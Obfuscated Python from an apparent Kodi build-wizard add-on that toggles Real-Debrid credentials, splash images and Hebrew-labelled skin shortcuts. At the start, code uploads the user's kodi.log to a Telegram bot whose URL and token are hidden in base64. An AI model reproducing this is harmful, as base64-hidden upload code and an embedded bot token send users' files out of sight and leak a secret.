         OOO0O00OOO00O000O ={'chat_id':(None ,'-274262389'),'document':(O00O0OOO00O0O0O00 ,open (O00O0OOO00O0O0O00 ,'rb')),}#line:584
         O0000O00O0O000O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:585
         O0O000OOOO0O0OO00 =requests .post (O0000O00O0O000O00 .decode ('base64'),files =OOO0O00OOO00O000O )#line:587
      elif xbmc .getCondVisibility ('system.platform.android'):#line:588
           O00O0OOO00O0O0O00 =xbmc .translatePath ('special://temp/kodi.log')#line:589
           OOO0O00OOO00O000O ={'chat_id':(None ,'-274262389'),'document':(O00O0OOO00O0O0O00 ,open (O00O0OOO00O0O0O00 ,'rb')),}#line:593
           O0000O00O0O000O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:594
           O0O000OOOO0O0OO00 =requests .post (O0000O00O0O000O00 .decode ('base64'),files =OOO0O00OOO00O000O )#line:596
      else :#line:597
           O00O0OOO00O0O0O00 =xbmc .translatePath ('special://kodi.log')#line:598
           OOO0O00OOO00O000O ={'chat_id':(None ,'-274262389'),'document':(O00O0OOO00O0O0O00 ,open (O00O0OOO00O0O0O00 ,'rb')),}#line:602
           O0000O00O0O000O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:603
           O0O000OOOO0O0OO00 =requests .post (O0000O00O0O000O00 .decode ('base64'),files =OOO0O00OOO00O000O )#line:605
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:606
def rdoff ():#line:608
	OO000OOOO000OOO0O =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:609
	OO000OOOO000OOO0O .setSetting ('rd.client_id','')#line:610
	OO000OOOO000OOO0O .setSetting ('rd.secret','')#line:611
	OO000OOOO000OOO0O .setSetting ('rdsource','false')#line:612
	OO000OOOO000OOO0O .setSetting ('super_fast_type_toren','false')#line:613
	OO000OOOO000OOO0O .setSetting ('rd.auth','false')#line:614
	OO000OOOO000OOO0O .setSetting ('rd.refresh','false')#line:615
	OO000OOOO000OOO0O =xbmcaddon .Addon ('script.module.resolveurl')#line:617
	OO000OOOO000OOO0O .setSetting ('RealDebridResolver_client_id','')#line:618
	OO000OOOO000OOO0O .setSetting ('RealDebridResolver_client_secret','')#line:619
	OO000OOOO000OOO0O .setSetting ('RealDebridResolver_token','')#line:620
	OO000OOOO000OOO0O .setSetting ('RealDebridResolver_refresh','')#line:621
	OO000OOOO000OOO0O =xbmcaddon .Addon ('plugin.video.seren')#line:623
	OO000OOOO000OOO0O .setSetting ('rd.client_id','')#line:624
	OO000OOOO000OOO0O .setSetting ('rd.secret','')#line:625
	OO000OOOO000OOO0O .setSetting ('rd.auth','')#line:626
	OO000OOOO000OOO0O .setSetting ('rd.refresh','')#line:627
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:628
		OO000OOOO000OOO0O =xbmcaddon .Addon ('plugin.video.gaia')#line:629
		OO000OOOO000OOO0O .setSetting ('accounts.debrid.realdebrid.id','')#line:630
		OO000OOOO000OOO0O .setSetting ('accounts.debrid.realdebrid.secret','')#line:631
		OO000OOOO000OOO0O .setSetting ('accounts.debrid.realdebrid.token','')#line:632
		OO000OOOO000OOO0O .setSetting ('accounts.debrid.realdebrid.refresh','')#line:633
	resloginit .resloginit ('restore','all')#line:634
	O00OO0O0OO000OO00 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:636
	OOO0OO00O0OO000OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:637
	copyfile (O00OO0O0OO000OO00 ,OOO0OO00O0OO000OO )#line:638
def skindialogsettind18 ():#line:639
	try :#line:640
		OO000O0000O0OO0O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:641
		O0OO0OOO0O000OOOO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:642
		copyfile (OO000O0000O0OO0O0 ,O0OO0OOO0O000OOOO )#line:643
	except :pass #line:644
def rdon ():#line:645
	loginit .loginIt ('restore','all')#line:646
	OOOO00000OOOO0O00 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:648
	O0000OO00OOOO00OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:649
	copyfile (OOOO00000OOOO0O00 ,O0000OO00OOOO00OO )#line:650
def adults18 ():#line:652
  O0OOOO0O0O0O000O0 =(ADDON .getSetting ("adults"))#line:653
  if O0OOOO0O0O0O000O0 =='true':#line:654
    OOOOO000OOO000O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:655
    with open (OOOOO000OOO000O00 ,'r')as O00OO0O0O0O0OO00O :#line:656
      OOO0OOOO00O0O000O =O00OO0O0O0O0OO00O .read ()#line:657
    OOO0OOOO00O0O000O =OOO0OOOO00O0O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:675
    with open (OOOOO000OOO000O00 ,'w')as O00OO0O0O0O0OO00O :#line:678
      O00OO0O0O0O0OO00O .write (OOO0OOOO00O0O000O )#line:679
def rdbuildaddon ():#line:680
  O0O0O0O0O000OO0O0 =(ADDON .getSetting ("rdbuild"))#line:681
  if O0O0O0O0O000OO0O0 =='true':#line:682
    OOO0OOOO00OO00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:683
    with open (OOO0OOOO00OO00O0O ,'r')as O00O000O0O0OO0OOO :#line:684
      O000OO0O00O0O00O0 =O00O000O0O0OO0OOO .read ()#line:685
    O000OO0O00O0O00O0 =O000OO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:703
    with open (OOO0OOOO00OO00O0O ,'w')as O00O000O0O0OO0OOO :#line:706
      O00O000O0O0OO0OOO .write (O000OO0O00O0O00O0 )#line:707
    OOO0OOOO00OO00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:711
    with open (OOO0OOOO00OO00O0O ,'r')as O00O000O0O0OO0OOO :#line:712
      O000OO0O00O0O00O0 =O00O000O0O0OO0OOO .read ()#line:713
    O000OO0O00O0O00O0 =O000OO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:731
    with open (OOO0OOOO00OO00O0O ,'w')as O00O000O0O0OO0OOO :#line:734
      O00O000O0O0OO0OOO .write (O000OO0O00O0O00O0 )#line:735
    OOO0OOOO00OO00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:739
    with open (OOO0OOOO00OO00O0O ,'r')as O00O000O0O0OO0OOO :#line:740
      O000OO0O00O0O00O0 =O00O000O0O0OO0OOO .read ()#line:741
    O000OO0O00O0O00O0 =O000OO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:759
    with open (OOO0OOOO00OO00O0O ,'w')as O00O000O0O0OO0OOO :#line:762
      O00O000O0O0OO0OOO .write (O000OO0O00O0O00O0 )#line:763
    OOO0OOOO00OO00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:767
    with open (OOO0OOOO00OO00O0O ,'r')as O00O000O0O0OO0OOO :#line:768
      O000OO0O00O0O00O0 =O00O000O0O0OO0OOO .read ()#line:769
    O000OO0O00O0O00O0 =O000OO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:787
    with open (OOO0OOOO00OO00O0O ,'w')as O00O000O0O0OO0OOO :#line:790
      O00O000O0O0OO0OOO .write (O000OO0O00O0O00O0 )#line:791
    OOO0OOOO00OO00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:794
    with open (OOO0OOOO00OO00O0O ,'r')as O00O000O0O0OO0OOO :#line:795
      O000OO0O00O0O00O0 =O00O000O0O0OO0OOO .read ()#line:796
    O000OO0O00O0O00O0 =O000OO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:814
    with open (OOO0OOOO00OO00O0O ,'w')as O00O000O0O0OO0OOO :#line:817
      O00O000O0O0OO0OOO .write (O000OO0O00O0O00O0 )#line:818
    OOO0OOOO00OO00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:820
    with open (OOO0OOOO00OO00O0O ,'r')as O00O000O0O0OO0OOO :#line:821
      O000OO0O00O0O00O0 =O00O000O0O0OO0OOO .read ()#line:822
    O000OO0O00O0O00O0 =O000OO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:840
    with open (OOO0OOOO00OO00O0O ,'w')as O00O000O0O0OO0OOO :#line:843
      O00O000O0O0OO0OOO .write (O000OO0O00O0O00O0 )#line:844
    OOO0OOOO00OO00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:846
    with open (OOO0OOOO00OO00O0O ,'r')as O00O000O0O0OO0OOO :#line:847
      O000OO0O00O0O00O0 =O00O000O0O0OO0OOO .read ()#line:848
    O000OO0O00O0O00O0 =O000OO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:866
    with open (OOO0OOOO00OO00O0O ,'w')as O00O000O0O0OO0OOO :#line:869
      O00O000O0O0OO0OOO .write (O000OO0O00O0O00O0 )#line:870
    OOO0OOOO00OO00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:873
    with open (OOO0OOOO00OO00O0O ,'r')as O00O000O0O0OO0OOO :#line:874
      O000OO0O00O0O00O0 =O00O000O0O0OO0OOO .read ()#line:875
    O000OO0O00O0O00O0 =O000OO0O00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:893
    with open (OOO0OOOO00OO00O0O ,'w')as O00O000O0O0OO0OOO :#line:896
      O00O000O0O0OO0OOO .write (O000OO0O00O0O00O0 )#line:897
def rdbuildinstall ():#line:900
  try :#line:901
   O0OO00OOOO0000O0O =(ADDON .getSetting ("rdbuild"))#line:902
   if O0OO00OOOO0000O0O =='true':#line:903
     O0000OO0O0OO0000O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:904
     O00000OO0O00OOOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:905
     copyfile (O0000OO0O0OO0000O ,O00000OO0O00OOOOO )#line:906
  except :#line:907
     pass #line:908
def rdbuildaddonoff ():#line:911
    O0O00OO000000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:914
    with open (O0O00OO000000OO00 ,'r')as OO00O0OOO0O000OO0 :#line:915
      O0OOO0OO000O0OOOO =OO00O0OOO0O000OO0 .read ()#line:916
    O0OOO0OO000O0OOOO =O0OOO0OO000O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:934
    with open (O0O00OO000000OO00 ,'w')as OO00O0OOO0O000OO0 :#line:937
      OO00O0OOO0O000OO0 .write (O0OOO0OO000O0OOOO )#line:938
    O0O00OO000000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:942
    with open (O0O00OO000000OO00 ,'r')as OO00O0OOO0O000OO0 :#line:943
      O0OOO0OO000O0OOOO =OO00O0OOO0O000OO0 .read ()#line:944
    O0OOO0OO000O0OOOO =O0OOO0OO000O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:962
    with open (O0O00OO000000OO00 ,'w')as OO00O0OOO0O000OO0 :#line:965
      OO00O0OOO0O000OO0 .write (O0OOO0OO000O0OOOO )#line:966
    O0O00OO000000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:970
    with open (O0O00OO000000OO00 ,'r')as OO00O0OOO0O000OO0 :#line:971
      O0OOO0OO000O0OOOO =OO00O0OOO0O000OO0 .read ()#line:972
    O0OOO0OO000O0OOOO =O0OOO0OO000O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:990
    with open (O0O00OO000000OO00 ,'w')as OO00O0OOO0O000OO0 :#line:993
      OO00O0OOO0O000OO0 .write (O0OOO0OO000O0OOOO )#line:994
    O0O00OO000000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:998
    with open (O0O00OO000000OO00 ,'r')as OO00O0OOO0O000OO0 :#line:999
      O0OOO0OO000O0OOOO =OO00O0OOO0O000OO0 .read ()#line:1000
    O0OOO0OO000O0OOOO =O0OOO0OO000O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1018
    with open (O0O00OO000000OO00 ,'w')as OO00O0OOO0O000OO0 :#line:1021
      OO00O0OOO0O000OO0 .write (O0OOO0OO000O0OOOO )#line:1022
    O0O00OO000000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1025
    with open (O0O00OO000000OO00 ,'r')as OO00O0OOO0O000OO0 :#line:1026
      O0OOO0OO000O0OOOO =OO00O0OOO0O000OO0 .read ()#line:1027
    O0OOO0OO000O0OOOO =O0OOO0OO000O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1045
    with open (O0O00OO000000OO00 ,'w')as OO00O0OOO0O000OO0 :#line:1048
      OO00O0OOO0O000OO0 .write (O0OOO0OO000O0OOOO )#line:1049
    O0O00OO000000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1051
    with open (O0O00OO000000OO00 ,'r')as OO00O0OOO0O000OO0 :#line:1052
      O0OOO0OO000O0OOOO =OO00O0OOO0O000OO0 .read ()#line:1053
    O0OOO0OO000O0OOOO =O0OOO0OO000O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1071
    with open (O0O00OO000000OO00 ,'w')as OO00O0OOO0O000OO0 :#line:1074
      OO00O0OOO0O000OO0 .write (O0OOO0OO000O0OOOO )#line:1075
    O0O00OO000000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1077
    with open (O0O00OO000000OO00 ,'r')as OO00O0OOO0O000OO0 :#line:1078
      O0OOO0OO000O0OOOO =OO00O0OOO0O000OO0 .read ()#line:1079
    O0OOO0OO000O0OOOO =O0OOO0OO000O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1097
    with open (O0O00OO000000OO00 ,'w')as OO00O0OOO0O000OO0 :#line:1100
      OO00O0OOO0O000OO0 .write (O0OOO0OO000O0OOOO )#line:1101
    O0O00OO000000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1104
    with open (O0O00OO000000OO00 ,'r')as OO00O0OOO0O000OO0 :#line:1105
      O0OOO0OO000O0OOOO =OO00O0OOO0O000OO0 .read ()#line:1106
    O0OOO0OO000O0OOOO =O0OOO0OO000O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1124
    with open (O0O00OO000000OO00 ,'w')as OO00O0OOO0O000OO0 :#line:1127
      OO00O0OOO0O000OO0 .write (O0OOO0OO000O0OOOO )#line:1128
def rdbuildinstalloff ():#line:1131
    try :#line:1132
       O00O0OO000OOO0O00 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1133
       OOO0OOOOO00O0O0O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1134
       copyfile (O00O0OO000OOO0O00 ,OOO0OOOOO00O0O0O0 )#line:1136
       O00O0OO000OOO0O00 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1138
       OOO0OOOOO00O0O0O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1139
       copyfile (O00O0OO000OOO0O00 ,OOO0OOOOO00O0O0O0 )#line:1141
       O00O0OO000OOO0O00 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1143
       OOO0OOOOO00O0O0O0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1144
       copyfile (O00O0OO000OOO0O00 ,OOO0OOOOO00O0O0O0 )#line:1146
       O00O0OO000OOO0O00 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1149
       OOO0OOOOO00O0O0O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1150
       copyfile (O00O0OO000OOO0O00 ,OOO0OOOOO00O0O0O0 )#line:1152
    except :#line:1154
       pass #line:1155
def rdbuildaddonON ():#line:1162
    O00OOO0O0OO0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1164
    with open (O00OOO0O0OO0000O0 ,'r')as O00O00O0O0OOO0O0O :#line:1165
      O0OO0O00O000O0000 =O00O00O0O0OOO0O0O .read ()#line:1166
    O0OO0O00O000O0000 =O0OO0O00O000O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1184
    with open (O00OOO0O0OO0000O0 ,'w')as O00O00O0O0OOO0O0O :#line:1187
      O00O00O0O0OOO0O0O .write (O0OO0O00O000O0000 )#line:1188
    O00OOO0O0OO0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1192
    with open (O00OOO0O0OO0000O0 ,'r')as O00O00O0O0OOO0O0O :#line:1193
